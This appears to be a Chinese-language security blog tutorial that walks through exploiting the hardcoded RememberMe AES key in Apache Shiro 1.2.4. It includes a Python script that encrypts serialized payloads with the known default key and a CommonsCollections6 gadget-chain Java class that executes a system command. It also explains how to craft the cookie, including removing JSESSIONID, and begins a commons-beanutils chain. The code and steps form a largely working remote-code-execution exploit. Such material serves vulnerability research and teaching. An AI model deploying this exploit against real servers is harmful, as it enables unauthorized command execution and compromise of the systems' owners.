+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.47.55@2x.png" alt="CleanShot2023-11-16at16.47.55@2x"></p>
+<p>看<code>decryptionCipherKey</code>是在哪赋值的</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.50.11@2x.png" alt="CleanShot2023-11-16at16.50.11@2x"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.52.27@2x.png" alt="CleanShot2023-11-16at16.52.27@2x"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.53.38@2x.png" alt="CleanShot2023-11-16at16.53.38@2x"></p>
+<p>发现常量<code>DEFAULT_CIPHER_KEY_BYTES</code>跟进后发现为固定的值 且算法为AES</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-16at16.56.04@2x.png" alt="CleanShot2023-11-16at16.56.04@2x"></p>
+<p>也就是说：<strong>在Shiro1.2.4版本，于<code>RememberMe</code>功能相关的加密<code>使用固定的key加密</code>，且加密算法为<code>AES算法</code>。</strong></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="JDK内置链打法"><a href="#JDK内置链打法" class="headerlink" title="JDK内置链打法"></a>JDK内置链打法</h3><h4 id="为什么不用CC链"><a href="#为什么不用CC链" class="headerlink" title="为什么不用CC链"></a>为什么不用CC链</h4><p><code>Shiro</code>自带的依赖里好像有<code>CC</code></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at10.16.30@2x.png" alt="CleanShot2023-11-17at10.16.30@2x"></p>
+<p>但用插件看下发现有很多依赖库都是[Test] 实际只能用[compile]和[runtime]</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at10.19.49@2x.png" alt="CleanShot2023-11-17at10.19.49@2x"></p>
+<p>所以直接用<code>CC</code>打是打不了的，这里可以用<code>commons-beanutils</code>来打（先不打）</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at10.22.45@2x.png" alt="CleanShot2023-11-17at10.22.45@2x"></p>
+<h4 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h4><p>先用Shiro原生的打，使用<code>URLDNS</code>序列化生成<code>ser.bin</code></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at10.58.14@2x.png" alt="CleanShot2023-11-17at10.58.14@2x"></p>
+<p>拷贝进脚本同目录</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.21.57@2x.png" alt="CleanShot2023-11-17at12.21.57@2x"></p>
+<p>加密脚本exp.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_dec</span>(<span class="params">enc_data</span>):</span><br><span class="line">    enc_data = base64.b64decode(enc_data)</span><br><span class="line">    unpad = <span class="keyword">lambda</span> s: s[:-s[-<span class="number">1</span>]]</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = enc_data[:<span class="number">16</span>]</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    plaintxt = encryptor.decrypt(enc_data[<span class="number">16</span>:])</span><br><span class="line">    <span class="comment">#plaintxt = bytes.decode(plaintxt)</span></span><br><span class="line">    plaintxt = unpad(plaintxt)</span><br><span class="line">    <span class="keyword">return</span> plaintxt</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    data = get_file_data(<span class="string">&quot;ser.bin&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(aes_enc(data))</span><br></pre></td></tr></table></figure>
+
+<h4 id="生成替换密钥"><a href="#生成替换密钥" class="headerlink" title="生成替换密钥"></a>生成替换密钥</h4><p>生成密钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(shiro_AES_exp) ➜  exp python exp.py</span><br><span class="line">b<span class="string">&#x27;TFJpdNMoTaqdUJqGEufEbIpwn5h5mH44sIfGlec5dZveEvXDbFmQed0eXqHQeSpvnOfrFhcYj5+pkkfGWQPEPx00ZjZ4kjgMl4W0vgIJFdkwDbeXRHllxCu2SGqDV1SJInXANAtRevP1IxJt2pACT42W/gqSNi6BRduOCblG47xn0YeT/KOSgULNjVZ1PoaWfHVbndkKonQhfRbhZgYJIIZ7IprRscHGfJC20g2VMnB+OYeCHPp2GQWt4cJWc3Lh26HHWna8yWhPV2RdM8C/y6ZIHKbSVqlZynX3jQ3+ncgm6spKutyOJiRhtU3EJivebfecc0U/TQh7ajbKLWccNfEiEYdIjnjqr2y3afOXzFBlhJayLIOOWLXBFUnGFY5qMlrY9R0bAfZzB9TYaM8tWy+YOyG+bIgMLIcbb3hTxvabvEnRAknFx5P8B880f8nujoJdelu2+eSY1MNcNjntz+O/FMWcbtXr81ioPQn7HlbsQMfRDKGoLFyLW6zd6eZd&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TFJpdNMoTaqdUJqGEufEbIpwn5h5mH44sIfGlec5dZveEvXDbFmQed0eXqHQeSpvnOfrFhcYj5+pkkfGWQPEPx00ZjZ4kjgMl4W0vgIJFdkwDbeXRHllxCu2SGqDV1SJInXANAtRevP1IxJt2pACT42W/gqSNi6BRduOCblG47xn0YeT/KOSgULNjVZ1PoaWfHVbndkKonQhfRbhZgYJIIZ7IprRscHGfJC20g2VMnB+OYeCHPp2GQWt4cJWc3Lh26HHWna8yWhPV2RdM8C/y6ZIHKbSVqlZynX3jQ3+ncgm6spKutyOJiRhtU3EJivebfecc0U/TQh7ajbKLWccNfEiEYdIjnjqr2y3afOXzFBlhJayLIOOWLXBFUnGFY5qMlrY9R0bAfZzB9TYaM8tWy+YOyG+bIgMLIcbb3hTxvabvEnRAknFx5P8B880f8nujoJdelu2+eSY1MNcNjntz+O/FMWcbtXr81ioPQn7HlbsQMfRDKGoLFyLW6zd6eZd</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><code>Cookie</code>内包含两个身份验证的参数 分别为<code>JSESSIONID</code>和<code>rememberMe</code></p>
+<p>在身份验证时的逻辑为：优先验证<code>JSESSIONID</code>，若存在则不会读取<code>rememberMe</code></p>
+<p>故：只替换修改请求包中的<code>rememberMe</code>的值，如图无法向下进行反序列化</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.32.11@2x.png" alt="CleanShot2023-11-17at12.32.11@2x"></p>
+<p>所以在替换<code>rememberMe</code>的值的同时，还需删除<code>JSESSIONID</code>，才能够保证反序列化正常执行</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.35.01@2x.png" alt="CleanShot2023-11-17at12.35.01@2x"></p>
+<p>根据回显可知成功调用反序列化</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.41.07@2x.png" alt="CleanShot2023-11-17at12.41.07@2x"></p>
+<h4 id="动态分析源码"><a href="#动态分析源码" class="headerlink" title="动态分析源码"></a>动态分析源码</h4><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.49.07@2x.png" alt="CleanShot2023-11-17at12.49.07@2x"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.50.16@2x.png" alt="CleanShot2023-11-17at12.50.16@2x"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.51.03@2x.png" alt="CleanShot2023-11-17at12.51.03@2x"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at12.51.42@2x.png" alt="CleanShot2023-11-17at12.51.42@2x"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20231117125300358.png" alt="image-20231117125300358"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20231117125403766.png" alt="image-20231117125403766"></p>
+<p>重新提交一次数据包 发现停在断点处</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at13.00.49@2x.png" alt="CleanShot2023-11-17at13.00.49@2x"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at13.02.16@2x.png" alt="CleanShot2023-11-17at13.02.16@2x"></p>
+<p>接下来会调取<code>HashMap</code></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20231117130548805.png" alt="image-20231117130548805"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at13.08.55@2x.png" alt="CleanShot2023-11-17at13.08.55@2x"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at13.10.15@2x.png" alt="CleanShot2023-11-17at13.10.15@2x"></p>
+<h3 id="CC链的利用"><a href="#CC链的利用" class="headerlink" title="CC链的利用"></a>CC链的利用</h3><p>因为Shiro内置不带CC依赖，这里先添加上CC3</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at15.06.51@2x.png" alt="CleanShot2023-11-17at15.06.51@2x"></p>
+<p>直接先用<code>cc6</code>生成<code>ser.bin</code>生成<code>RememberMe</code>值做请求<br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at15.18.11@2x.png" alt="CleanShot2023-11-17at15.18.11@2x"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at15.27.14@2x.png" alt="CleanShot2023-11-17at15.27.14@2x"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at15.40.13@2x.png" alt="CleanShot2023-11-17at15.40.13@2x"></p>
+<p>看下<code>ClassResolvingObjectInputStream</code>内是如何定义的</p>
+<p>发现重写了一个<code>resolveClass</code>(是一个用于在对象反序列化过程中进行类解析的方法,该方法属于 ObjectInputStream 类的内部类 ObjectStreamClass)，在重写后则会调用重写的这个<code>resolveClass</code>方法</p>
+<p>对比一下重写前后</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.14.20@2x.png" alt="CleanShot2023-11-17at16.14.20@2x"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.15.00@2x.png" alt="CleanShot2023-11-17at16.15.00@2x"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.18.44@2x.png" alt="CleanShot2023-11-17at16.18.44@2x"></p>
+<p>若想成功利用，需解决<code>加载不到这个数组类</code>的问题，所以要不出现数组（<strong>在此不详述：为什么加载不了？与tomcat类加载机制有关</strong>）</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.21.10@2x.png" alt="CleanShot2023-11-17at16.21.10@2x"></p>
+<p>结合之前<code>CC1-CC7</code>链的学习 如何在<code>不出现Transformer数组的前提下</code>拼接一条可利用的链</p>
+<p>不能走<code>Runtime.exec()</code>，因为无法避免要用到数组</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.26.35@2x.png" alt="CleanShot2023-11-17at16.26.35@2x"></p>
+<p>可以使用之前<code>CC2</code>的后半段（不会出现数组类） 但前半段不能使用</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.29.59@2x.png" alt="CleanShot2023-11-17at16.29.59@2x"></p>
+<p>可以拼接<code>CC2+CC3+CC6</code>(CC6可以控制输入)</p>
+<p>动态加载类&lt;–TemplatesImpl.newTransformer&lt;–invokerTransformer</p>
+<p>HashMap.readObject–&gt;TiedMapEntry.get–&gt;LazyMap.get–&gt;invokerTransformer–&gt;Templateslmpl.<br>newTransformer–&gt;动态加载类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//put时调用无用的transformer</span></span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        <span class="comment">//删除key</span></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射修改lazyMap的factory属性为chainedTransformer</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(map2);</span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span> <span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span> <span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>执行序列化生成<code>ser.bin</code> 并复制替换到exp.py目录下生成新的exp</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.48.12@2x.png" alt="CleanShot2023-11-17at16.48.12@2x"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.51.10@2x.png" alt="CleanShot2023-11-17at16.51.10@2x"></p>
+<p>忽略断点后提交请求 成功执行命令</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-17at16.50.23@2x.png" alt="CleanShot2023-11-17at16.50.23@2x"></p>
+<h3 id="CB链的利用"><a href="#CB链的利用" class="headerlink" title="CB链的利用"></a>CB链的利用</h3><p>删除pom.xml里的<code>commons-collections</code>依赖</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/CleanShot2023-11-20at09.59.11@2x.png" alt="CleanShot2023-11-20at09.59.11@2x"></p>
+<p>在ShiroExp项目pom.xml内添加与web项目版本一致的CB依赖<br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240104112020212.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Person.java</span><br><span class="line">```java</span><br><span class="line">package org.example;  </span><br><span class="line">  </span><br><span class="line">public class Person &#123;  </span><br><span class="line">  </span><br><span class="line">private String name;  </span><br><span class="line">private int age;  </span><br><span class="line">  </span><br><span class="line">public Person(String name, int age) &#123;  </span><br><span class="line">this.name = name;  </span><br><span class="line">this.age = age;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">public String getName() &#123; return name; &#125;  </span><br><span class="line">  </span><br><span class="line">public void setName(String name) &#123; this.name = name; &#125;  </span><br><span class="line">  </span><br><span class="line">public int getAge() &#123; return age; &#125;  </span><br><span class="line">  </span><br><span class="line">public void setAge(int age) &#123; this.age = age; &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>BeanTest.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BeanTest</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aaa&quot;</span>,<span class="number">18</span>);  </span><br><span class="line"><span class="comment">//System.out.println(person.getName());  </span></span><br><span class="line">System.out.println(PropertyUtils.getProperty(person,<span class="string">&quot;name&quot;</span>));  </span><br><span class="line">System.out.println(PropertyUtils.getProperty(person,<span class="string">&quot;age&quot;</span>));  </span><br><span class="line"><span class="comment">//PropertyUtils.getProperty(template,&quot;outputProperties&quot;);  </span></span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>加断点分析<br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115101937341.png"><br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115102026802.png"><br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115102136143.png"><br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115102323885.png"><br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115102624084.png"><br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115103019443.png"><br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115103051026.png"><br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115103129700.png"><br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115103255828.png"><br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115103339819.png"><br>回想CC3时的TemplatesImpl类的getOutputProperties方法调用了newTransformer<br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115104045878.png"><br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115104158415.png"><br>且getOutputProperties的命名格式符合JavaBean的<br>尝试一下<br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115105558675.png"><br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115105943229.png"><br>修改调整一下<br><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/06/image-20240115125323686.png"></p>
